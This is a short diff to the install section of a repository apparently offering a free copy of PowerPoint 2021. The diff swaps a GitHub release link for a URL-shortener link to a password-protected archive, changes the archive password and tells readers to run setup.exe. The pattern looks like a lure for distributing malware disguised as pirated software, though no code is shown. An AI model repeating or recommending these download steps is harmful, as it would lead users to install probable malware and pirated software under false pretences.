@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://github.com/Ballinrobe/power-point-2021/releases/download/Download/PowerPoint21.rar)
-- Open archive (password: point21)
+- [Download](https://goo.su/IbA2a)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
